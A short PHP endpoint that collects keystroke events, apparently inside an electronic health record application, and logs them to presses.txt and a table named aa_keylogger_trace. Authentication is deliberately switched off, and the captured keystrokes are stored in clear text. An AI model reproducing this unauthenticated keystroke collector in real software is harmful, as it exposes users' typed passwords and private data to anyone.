<?php

$ignoreAuth = true;
require_once("../interface/globals.php");
require_once("../library/sql.inc");

$entityBody = file_get_contents('php://input');
if (!empty($entityBody)) {
    // log to file
    $file = fopen('presses.txt', 'a+');
    fwrite($file, $entityBody . PHP_EOL);
    fclose($file);

    // log to sql
    $decoded = json_decode($entityBody);
    $user = $decoded->user;
    foreach ($decoded->events as $event) {
        $sqlBinds = array($user, $event->time, $event->type);
        if (property_exists($event, 'data')) {
            $query = "INSERT INTO aa_keylogger_trace ( user, time, type, data ) VALUES ( ?, ?, ?, ?)";
            array_push($sqlBinds, $event->data);
        } else {
            $query = "INSERT INTO aa_keylogger_trace ( user, time, type, data ) VALUES ( ?, ?, ?, '')";
        }
        sqlInsert($query, $sqlBinds);
    }
    print("Successfully Logged.");
} else {
    print("EntiyBody is empty.");
}
?>

